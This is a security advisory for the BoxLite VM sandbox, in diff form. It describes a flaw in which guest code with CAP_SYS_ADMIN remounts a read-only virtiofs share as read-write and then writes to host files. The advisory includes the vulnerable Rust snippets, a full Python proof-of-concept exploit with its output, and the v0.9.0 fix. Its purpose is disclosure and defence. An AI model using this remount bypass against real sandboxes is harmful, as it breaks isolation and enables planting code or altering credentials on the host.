@@ -1,0 +1,357 @@
+PYSEC-2026-299 PyPI/boxlite — BoxLite: Permission Bypass Allows Modification of Read-Only Files
+package: boxlite
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.9.0 (ECOSYSTEM)
+aliases: CVE-2026-46695, GHSA-g6ww-w5j2-r7x3
+references:
+  https://github.com/boxlite-ai/boxlite/security/advisories/GHSA-g6ww-w5j2-r7x3
+  https://nvd.nist.gov/vuln/detail/CVE-2026-46695
+  https://github.com/boxlite-ai/boxlite/pull/454
+  https://github.com/boxlite-ai/boxlite
+  https://github.com/boxlite-ai/boxlite/releases/tag/v0.9.0
+  https://rustsec.org/advisories/RUSTSEC-2026-0147.html
+  https://pypi.org/project/boxlite
+  https://github.com/advisories/GHSA-g6ww-w5j2-r7x3
+
+#### Summary
+
+Boxlite is a sandbox service that allows users to create lightweight virtual machines (Boxes) and launch OCI containers within them to run untrusted code.
+
+One of the core security features claimed by Boxlite is the ability to mount host directories in read-only mode (read_only=True) into the VM via the virtiofs protocol (a host-guest shared filesystem protocol designed specifically for virtual machines), so that untrusted code can only read but not modify host data. Since the underlying function of the lightweight VM library libkrun used by Boxlite does not support mounting in read-only mode, Boxlite chooses to implement read-only by adding the MS_RDONLY flag when mounting the directory after the VM starts.
+
+However, because Boxlite does not restrict the kernel capabilities available inside the container, malicious code can remount the directory in rw mode, thereby gaining write access to that directory. This allows malicious code to perform arbitrary write operations on directories that should be read-only.
+
+In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.
+
+
+
+#### Details
+
+1. User-Facing API Documents Read-Only Guarantee
+
+**File:** `boxlite/src/runtime/options.rs` **Function:** `VolumeSpec` (line 223) **Code:**
+
+```rust
+/// Filesystem mount specification.
+pub struct VolumeSpec {
+    pub host_path: String,
+    pub guest_path: String,
+    pub read_only: bool,  // <-- operator sets this to restrict guest write access
+}
+```
+
+**Issue:** The `read_only` field is documented (and in user-facing guides) as preventing the guest from writing to the host directory. The guarantee is "Agent can read but not write." This expectation is not met.
+
+2. read_only Stored in FsShare — Passed to krun Without Enforcement
+
+**File:** `boxlite/src/vmm/krun/engine.rs` **Function:** `Krun::create()` (line 334) **Code:**
+
+```rust
+for share in config.fs_shares.shares() {
+    let path_str = share.host_path.to_str().ok_or_else(|| { ... })?;
+
+    tracing::info!(
+        "  {} → {} ({})",
+        share.tag,
+        share.host_path.display(),
+        if share.read_only { "ro" } else { "rw" }  // Logged but NOT passed to krun
+    );
+    ctx.add_virtiofs(&share.tag, path_str)?;  // <-- read_only silently dropped
+}
+```
+
+**Issue:** `share.read_only` is logged as "ro" or "rw" but is never passed to `add_virtiofs`. The actual hypervisor call receives only tag and host path.
+
+3. Hypervisor FFI Has No Read-Only Parameter
+
+**File:** `boxlite/src/vmm/krun/context.rs` **Function:** `add_virtiofs()` (line 423) **Code:**
+ 
+```rust
+pub unsafe fn add_virtiofs(&self, mount_tag: &str, host_path: &str) -> BoxliteResult<()> {
+    let host_path_c = CString::new(host_path)
+        .map_err(|e| BoxliteError::Engine(format!("invalid host path: {e}")))?;
+    let mount_tag_c = CString::new(mount_tag)
+        .map_err(|e| BoxliteError::Engine(format!(" invalid mount tag: {e}")))?;
+
+    check_status("krun_add_virtiofs", unsafe {
+        krun_add_virtiofs(self.ctx_id, mount_tag_c.as_ptr(), host_path_c.as_ptr())
+        // No read_only parameter — libkrun exposes the share as read-write to the guest
+    })
+}
+```
+
+**Issue:** `krun_add_virtiofs` in the FFI (`deps/libkrun-sys/src/lib.rs:35`) takes only `ctx_id`, `mount_tag`, and `host_path`. There is no read-only flag. Libkrun exposes the virtiofs share to the guest with full read-write access at the device level.
+
+4. Read-Only Enforcement Is Delegated to Guest Agent (Zone 0)
+
+**File:** `boxlite/src/volumes/guest_volume.rs` **Function:** `build_guest_mounts()` (line 184) **Code:**
+
+```rust
+for entry in &self.fs_shares {
+    let mount_point = entry.guest_path.as_deref().unwrap_or("");
+    volumes.push(VolumeConfig::virtiofs(
+        &entry.tag,
+        mount_point,
+        entry.read_only,       // <-- sent to guest agent as instruction
+        entry.container_id.clone(),
+    ));
+ }
+```
+
+**Issue:** The `read_only` flag is sent to the guest agent via gRPC as a mount instruction. The guest agent is expected to pass `-o ro` to the mount syscall. But the guest runs Zone 0 code — untrusted, assumed malicious. A compromised or malicious guest simply ignores this instruction.
+
+5. FFI Declaration Confirms No Read-Only Variant Exists
+
+**File:** `boxlite/deps/libkrun-sys/src/lib.rs` **Function:** `krun_add_virtiofs` extern declaration (line 35) **Code:**
+
+```rust
+extern "C" {
+    pub fn krun_add_virtiofs(
+        ctx_id: u32,
+        mount_tag: *const c_char,
+        host_path: *const c_char,
+    ) -> i32;
+    // No krun_add_virtiofs_ro or equivalent declared
+}
+```
+
+**Issue:** There is no alternative read-only virtiofs FFI function declared. The entire codebase has no `krun_add_virtiofs_ro` or read-only parameter variant. Enforcement at the hypervisor level does not exist.
+
+6. OCI Spec Builder Grants All Capabilities
+
+ **File:** `guest/src/container/capabilities.rs` **Function:** `all_capabilities()` (line 19) **Code:**
+
+ ```rust
+ pub fn all_capabilities() -> HashSet<Capability> {
+     [
+         // ...
+         Capability::SysModule,    // 16: load/unload kernel modules
+         Capability::SysRawio,     // 17: perform I/O port operations
+         Capability::SysAdmin,     // 21: various admin operations
+         Capability::NetAdmin,     // 12: network administration
+         Capability::NetRaw,       // 13: use RAW/PACKET sockets
+         Capability::MacOverride,  // 32: override MAC
+         Capability::Bpf,          // 39: BPF operations
+         // ... all 41 capabilities
+     ]
+     .into_iter()
+     .collect()
+ }
+ ```
+
+**Issue:** Returns all 41 capabilities including the most dangerous ones, like `Capability::SysAdmin`. The function comment itself says "maximum compatibility but reduced security isolation."
+
+
+
+#### PoC
+
+1. Install Boxlite following the official tutorial.
+
+2. Run the following Python script:
+
+   ```python
+   import asyncio
+   import os
+   import tempfile
+   import sys
+   from boxlite import Boxlite, BoxOptions
+   
+   
+   async def run(box, cmd):
+       """Run shell command via native box.exec API."""
+       execution = await box.exec("sh", ["-c", cmd], None)
+       stdout_stream = execution.stdout()
+       stderr_stream = execution.stderr()
+   
+       stdout_lines, stderr_lines = [], []
+   
+       async def read_stdout():
+           async for line in stdout_stream:
+               stdout_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))
+   
+       async def read_stderr():
+           async for line in stderr_stream:
+               stderr_lines.append(line if isinstance(line, str) else line.decode('utf-8', errors='replace'))
+   
+       await asyncio.gather(read_stdout(), read_stderr())
+       result = await execution.wait()
+   
+       return {
+           'exit_code': result.exit_code,
+           'stdout': ''.join(stdout_lines),
+           'stderr': ''.join(stderr_lines),
+       }
+   
+   async def main():
+       # Step 1: Set up host directory with a read-only file
+       host_dir = tempfile.mkdtemp(prefix="virtiofs_ro_poc_")
+       ro_file = os.path.join(host_dir, "read_only.txt")
+   
+       with open(ro_file, "w") as f:
+           f.write("original content\n")
+   
+       print(f"[+] Step 1: Host directory created: {host_dir}")
+       print(f"    read_only.txt: {open(ro_file).read().strip()}")
+       print()
+   
+       guest_mount = "/mnt/sensitive"
+       print(f"[+] Step 2: Launching BoxLite VM with:")
+       print(f"    volumes=[('{host_dir}', '{guest_mount}', True)]  # read_only=True")
+       print()
+   
+       try:
+           runtime = Boxlite.default()
+           opts = BoxOptions(
+               image="alpine:latest",
+               volumes=[(host_dir, guest_mount, True)],  # <-- read_only=True
+               memory_mib=512,
+               cpus=1,
+               auto_remove=True,
+           )
+   
+           box = await runtime.create(opts)
+           async with box:
+               print("[+] Step 3: VM booted. Checking virtiofs mount state...")
+               r = await run(box, f"cat /proc/mounts | grep sensitive")
+               print(f"    /proc/mounts: {r['stdout'].strip()}")
+               print()
+   
+               print("[+] Step 4: Testing write protection (initial state)...")
+               r2 = await run(box, f"echo 'modified content' > {guest_mount}/read_only.txt 2>&1; echo write_exit:$?")
+               out = r2['stdout'].strip()
+               print(f"    Write attempt: {out}")
+               if "Read-only" in out or "read-only" in out:
+                   print(f"    [OK] Initially blocked - client-side MS_RDONLY is active")
+               print()
+   
+               print("[!!!] Step 5: ATTACK - Bypassing read-only via remount...")
+               r3 = await run(box, f"mount -o remount,rw {guest_mount} 2>&1; echo remount_exit:$?")
+               print(f"    Remount result: {r3['stdout'].strip()}")
+               r4 = await run(box, f"cat /proc/mounts | grep sensitive")
+               print(f"    Mount flags after: {r4['stdout'].strip()}")
+               print()
+   
+               print("[!!!] Step 6: Writing to 'read-only' mount after bypass...")
+               r5 = await run(box, f"echo 'modified content' > {guest_mount}/read_only.txt 2>&1; echo write_exit:$?")
+               print(f"    Write result: {r5['stdout'].strip()}")
+               r6 = await run(box, f"cat {guest_mount}/read_only.txt")
+               print(f"    File content inside guest: {r6['stdout'].strip()}")
+               print()
+   
+           print("[+] Step 7: HOST VERIFICATION")
+           content = open(ro_file).read().strip()
+           print(f"    read_only.txt on host: {content}")
+           print()
+   
+           print("FINAL RESULT:")
+           print()
+           if content == "modified content":
+               print("  [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE")
+           else:
+               print("  [?] Bypass did not produce host-side writes.")
+   
+       except Exception as e:
+           print(f"[-] Error: {e}")
+           import traceback
+           traceback.print_exc()
+       finally:
+           import shutil
+           try:
+               shutil.rmtree(host_dir)
+               print(f"\n[+] Cleanup: removed {host_dir}")
+           except:
+               pass
+   
+   asyncio.run(main())
+   ```
+
+   This script mounts a directory in read-only mode into the sandbox and attempts to exploit the vulnerability to modify a file in that directory. Expected output:
+
+   ```
+   $ python poc.py
+   [+] Step 1: Host directory created: /tmp/virtiofs_ro_poc_93fdis21
+       read_only.txt: original content
+   
+   [+] Step 2: Launching BoxLite VM with:
+       volumes=[('/tmp/virtiofs_ro_poc_93fdis21', '/mnt/sensitive', True)]  # read_only=True
+   
+   [+] Step 3: VM booted. Checking virtiofs mount state...
+       /proc/mounts: uservol0 /mnt/sensitive virtiofs ro,relatime 0 0
+   
+   [+] Step 4: Testing write protection (initial state)...
+       Write attempt: write_exit:1
+   
+   [!!!] Step 5: ATTACK - Bypassing read-only via remount...
+       Remount result: remount_exit:0
+       Mount flags after: uservol0 /mnt/sensitive virtiofs rw,relatime 0 0
+   
+   [!!!] Step 6: Writing to 'read-only' mount after bypass...
+       Write result: write_exit:0
+       File content inside guest: modified content
+   
+   [+] Step 7: HOST VERIFICATION
+       read_only.txt on host: modified content
+   
+   FINAL RESULT:
+   
+     [!!!] VULNERABILITY CONFIRMED - EXPLOITABLE
+   
+   [+] Cleanup: removed /tmp/virtiofs_ro_poc_93fdis21
+   ```
+
+   
+
+
+
+#### Impact
+
+Malicious code can perform arbitrary write operations on directories that should be read-only.
+
+In typical usage scenarios of Boxlite, an attacker can leverage this vulnerability to gain code execution capability on the host. For example, in AI Agent scenarios, user code, virtual environments, credentials, configuration files, and other content are often mounted in read-only mode into the container. Malicious code inside the sandbox can modify this information, such as planting malicious code, to gain code execution capability on the host, which may further introduce supply chain risks.
+
+
+
+#### Score
+
+Severity: Critical, Score: 10.0, rationale as follows: 
+
+- **AV:N** — Malicious code can be transmitted through networks, such as code written by large language models.
+- **AC:L** — No special conditions or race conditions are required. The attacker simply executes a `mount -o remount,rw` command inside the container. `CAP_SYS_ADMIN` is granted by default, and the attack is deterministic and trivially reproducible.
+- **PR:N** — The attacker needs the ability to execute arbitrary code inside the Boxlite sandbox, which is the fundamental use case of Boxlite (running untrusted code). 
+- **UI:N** — No user interaction is required. Malicious code inside the container can autonomously exploit this vulnerability without any action from the host operator.
+- **S:C** — The vulnerability allows the attacker to cross the sandbox trust boundary and impact the host system. The vulnerable component is the Boxlite sandbox isolation mechanism, but the impacted component is the host filesystem.
+- **C:H** — With write access to host directories, the attacker can plant malicious code that will be executed by the host, leading to full compromise of sensitive host data including credentials, API keys, user code, and configuration files mounted into the container.
+ - **I:H** — The attacker gains full write access to host directories explicitly intended to be read-only, allowing arbitrary modification of host files including planting backdoors, modifying virtual environments for supply chain attacks, and altering credentials and configuration files.
+- **A:N** — The vulnerability primarily enables unauthorized write access. The host system and Boxlite service continue to function; no distinct availability impact mechanism exists beyond secondary consequences of write access.
+
+
+
+#### Credit
+
+This vulnerability was discovered by:
+
+ - XlabAI Team of Tencent Xuanwu Lab
+- Atuin Automated Vulnerability Discovery Engine
+ 
+CVE and credit are preferred.
+
+If you have any questions regarding the vulnerability details, please feel free to reach out to us for further discussion. Our email address is xlabai@tencent.com.
+
+
+
+#### Note
+
+Note that we follow the industry-standard **90+30 disclosure policy** (Reference: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html). This means that we reserve the right to disclose the details of the vulnerability 30 days after the fix has been implemented.
+
+#### Resolution
+
+Fixed in **v0.9.0** by PR #454 (commit `2c26968e`), released 2026-04-29, with defense-in-depth across three layers:
+
+1. **Hypervisor-level read-only enforcement.** virtio-fs shares are now created via `krun_add_virtiofs3` (libkrun v1.18.0) with the `read_only` flag passed through, so the share is read-only at the virtio-fs device — before any request reaches the guest kernel. A malicious guest `mount -o remount,rw` can no longer reach host data even if it regained `CAP_SYS_ADMIN`.
+2. **Capability restriction.** Containers now receive the 14 Docker-default capabilities, explicitly excluding `CAP_SYS_ADMIN` (and `CAP_NET_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_RAWIO`, `CAP_MAC_OVERRIDE`), so the remount in the PoC fails with `EPERM`.
+3. **TSI network isolation.** When the network is disabled, the implicit vsock is replaced with an explicit vsock with no TSI features, closing a related guest→host socket-forwarding path.
+
+Regression coverage: `src/boxlite/tests/security_enforcement.rs` (Rust core) and `sdks/python/tests/test_readonly_volume_remount.py` (Python SDK) both replay the PoC remount attack and assert it fails.
+
+**Remediation:** upgrade to boxlite **0.9.0 or later** (all SDKs: PyPI `boxlite`, npm `@boxlite-ai/boxlite`, Go module `github.com/boxlite-ai/boxlite/sdks/go`, crates.io `boxlite` / `boxlite-cli`). There is no workaround for affected versions; upgrade is required.
